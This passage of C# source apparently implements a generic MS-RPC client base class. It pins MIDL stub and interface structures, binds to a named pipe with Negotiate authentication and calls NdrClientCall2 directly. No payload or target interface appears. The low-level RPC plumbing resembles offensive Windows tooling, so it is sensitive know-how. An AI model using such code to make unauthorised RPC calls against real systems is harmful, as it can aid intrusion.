            RPC_CLIENT_INTERFACE clientinterfaceObject = new RPC_CLIENT_INTERFACE(interfaceID, MajorVerson, MinorVersion);

            COMM_FAULT_OFFSETS commFaultOffset = new COMM_FAULT_OFFSETS();
            commFaultOffset.CommOffset = -1;
            commFaultOffset.FaultOffset = -1;
            faultoffsets = GCHandle.Alloc(commFaultOffset, GCHandleType.Pinned);
            clientinterface = GCHandle.Alloc(clientinterfaceObject, GCHandleType.Pinned);
            formatString = GCHandle.Alloc(MIDL_TypeFormatString, GCHandleType.Pinned);

            MIDL_STUB_DESC stubObject = new MIDL_STUB_DESC(formatString.AddrOfPinnedObject(),
                                                            clientinterface.AddrOfPinnedObject(),
                                                            Marshal.GetFunctionPointerForDelegate(AllocateMemoryDelegate),
                                                            Marshal.GetFunctionPointerForDelegate(FreeMemoryDelegate));

            stub = GCHandle.Alloc(stubObject, GCHandleType.Pinned);
        }


        protected void freeStub()
        {
            procString.Free();
            faultoffsets.Free();
            clientinterface.Free();
            formatString.Free();
            stub.Free();
        }

        delegate IntPtr allocmemory(int size);

        protected static IntPtr AllocateMemory(int size)
        {
            IntPtr memory = Marshal.AllocHGlobal(size);
            return memory;
        }

        delegate void freememory(IntPtr memory);

        protected static void FreeMemory(IntPtr memory)
        {
            Marshal.FreeHGlobal(memory);
        }


        protected IntPtr Bind(IntPtr IntPtrserver)
        {
            string server = Marshal.PtrToStringUni(IntPtrserver);
            IntPtr bindingstring = IntPtr.Zero;
            IntPtr binding = IntPtr.Zero;
            Int32 status;
            status = RpcStringBindingCompose(interfaceId.ToString(), "ncacn_np", server, PipeName, null, out bindingstring);
            if (status != 0)
            {
                Console.WriteLine("[x] RpcStringBindingCompose failed with status 0x" + status.ToString("x"));
                return IntPtr.Zero;
            }
            status = RpcBindingFromStringBinding(Marshal.PtrToStringUni(bindingstring), out binding);
            RpcBindingFree(ref bindingstring);
            if (status != 0)
            {
                Console.WriteLine("[x] RpcBindingFromStringBinding failed with status 0x" + status.ToString("x"));
                return IntPtr.Zero;
            }

            status = RpcBindingSetAuthInfo(binding, server, /* RPC_C_AUTHN_LEVEL_PKT_PRIVACY */ 6, /* RPC_C_AUTHN_GSS_NEGOTIATE */ 9, IntPtr.Zero, 16);
            if (status != 0)
            {
                Console.WriteLine("[x] RpcBindingSetAuthInfo failed with status 0x" + status.ToString("x"));
            }

            status = RpcBindingSetOption(binding, 12, new IntPtr(RPCTimeOut));
            if (status != 0)
            {
                Console.WriteLine("[x] RpcBindingSetOption failed with status 0x" + status.ToString("x"));
            }
            Console.WriteLine("[!] binding ok (handle=" + binding.ToString("x") + ")");
            return binding;
        }

        protected IntPtr GetProcStringHandle(int offset)
        {
            return Marshal.UnsafeAddrOfPinnedArrayElement(MIDL_ProcFormatString, offset);
        }

        protected IntPtr GetStubHandle()
        {
            return stub.AddrOfPinnedObject();
        }
        protected IntPtr CallNdrClientCall2x86(int offset, params IntPtr[] args)
        {

            GCHandle stackhandle = GCHandle.Alloc(args, GCHandleType.Pinned);
            IntPtr result;
            try
            {
                result = NdrClientCall2x86(GetStubHandle(), GetProcStringHandle(offset), stackhandle.AddrOfPinnedObject());
            }
            finally
            {
                stackhandle.Free();
            }
            return result;
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    struct COMM_FAULT_OFFSETS
    {
        public short CommOffset;
        public short FaultOffset;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct RPC_VERSION
    {
        public ushort MajorVersion;
        public ushort MinorVersion;
        public RPC_VERSION(ushort InterfaceVersionMajor, ushort InterfaceVersionMinor)
        {
            MajorVersion = InterfaceVersionMajor;
            MinorVersion = InterfaceVersionMinor;
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    struct RPC_SYNTAX_IDENTIFIER
    {
        public Guid SyntaxGUID;
        public RPC_VERSION SyntaxVersion;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct RPC_CLIENT_INTERFACE
    {
        public uint Length;
        public RPC_SYNTAX_IDENTIFIER InterfaceId;
        public RPC_SYNTAX_IDENTIFIER TransferSyntax;
        public IntPtr /*PRPC_DISPATCH_TABLE*/ DispatchTable;
        public uint RpcProtseqEndpointCount;
        public IntPtr /*PRPC_PROTSEQ_ENDPOINT*/ RpcProtseqEndpoint;
        public IntPtr Reserved;
        public IntPtr InterpreterInfo;
        public uint Flags;

        public static Guid IID_SYNTAX = new Guid(0x8A885D04u, 0x1CEB, 0x11C9, 0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60);

        public RPC_CLIENT_INTERFACE(Guid iid, ushort InterfaceVersionMajor, ushort InterfaceVersionMinor)
        {
            Length = (uint)Marshal.SizeOf(typeof(RPC_CLIENT_INTERFACE));
            RPC_VERSION rpcVersion = new RPC_VERSION(InterfaceVersionMajor, InterfaceVersionMinor);
            InterfaceId = new RPC_SYNTAX_IDENTIFIER();
            InterfaceId.SyntaxGUID = iid;
            InterfaceId.SyntaxVersion = rpcVersion;
            rpcVersion = new RPC_VERSION(2, 0);
            TransferSyntax = new RPC_SYNTAX_IDENTIFIER();
            TransferSyntax.SyntaxGUID = IID_SYNTAX;
            TransferSyntax.SyntaxVersion = rpcVersion;
            DispatchTable = IntPtr.Zero;
            RpcProtseqEndpointCount = 0u;
            RpcProtseqEndpoint = IntPtr.Zero;
            Reserved = IntPtr.Zero;
            InterpreterInfo = IntPtr.Zero;
            Flags = 0u;
        }
    }

    [StructLayout(LayoutKind.Sequential)]
   
    struct MIDL_STUB_DESC
    {
        public IntPtr /*RPC_CLIENT_INTERFACE*/ RpcInterfaceInformation;
        public IntPtr pfnAllocate;
        public IntPtr pfnFree;
        public IntPtr pAutoBindHandle;
        public IntPtr /*NDR_RUNDOWN*/ apfnNdrRundownRoutines;
        public IntPtr /*GENERIC_BINDING_ROUTINE_PAIR*/ aGenericBindingRoutinePairs;
        public IntPtr /*EXPR_EVAL*/ apfnExprEval;
        public IntPtr /*XMIT_ROUTINE_QUINTUPLE*/ aXmitQuintuple;
        public IntPtr pFormatTypes;
        public int fCheckBounds;
        /* Ndr library version. */
        public uint Version;
        public IntPtr /*MALLOC_FREE_STRUCT*/ pMallocFreeStruct;
        public int MIDLVersion;
        public IntPtr CommFaultOffsets;
        // New fields for version 3.0+
        public IntPtr /*USER_MARSHAL_ROUTINE_QUADRUPLE*/ aUserMarshalQuadruple;
        // Notify routines - added for NT5, MIDL 5.0
        public IntPtr /*NDR_NOTIFY_ROUTINE*/ NotifyRoutineTable;
        public IntPtr mFlags;
        // International support routines - added for 64bit post NT5
        public IntPtr /*NDR_CS_ROUTINES*/ CsRoutineTables;
        public IntPtr ProxyServerInfo;
        public IntPtr /*NDR_EXPR_DESC*/ pExprInfo;
        // Fields up to now present in win2000 release.

        public MIDL_STUB_DESC(IntPtr pFormatTypesPtr, IntPtr RpcInterfaceInformationPtr,
                                IntPtr pfnAllocatePtr, IntPtr pfnFreePtr)
        {
            pFormatTypes = pFormatTypesPtr;
            RpcInterfaceInformation = RpcInterfaceInformationPtr;
            CommFaultOffsets = IntPtr.Zero;
            pfnAllocate = pfnAllocatePtr;
            pfnFree = pfnFreePtr;
            pAutoBindHandle = IntPtr.Zero;
            apfnNdrRundownRoutines = IntPtr.Zero;
            aGenericBindingRoutinePairs = IntPtr.Zero;
            apfnExprEval = IntPtr.Zero;
            aXmitQuintuple = IntPtr.Zero;
            fCheckBounds = 1;
            Version = 0x50002u;
            pMallocFreeStruct = IntPtr.Zero;
            MIDLVersion = 0x801026e;
            aUserMarshalQuadruple = IntPtr.Zero;
            NotifyRoutineTable = IntPtr.Zero;
            mFlags = new IntPtr(0x00000001);
            CsRoutineTables = IntPtr.Zero;
            ProxyServerInfo = IntPtr.Zero;
            pExprInfo = IntPtr.Zero;
        }
    }
}
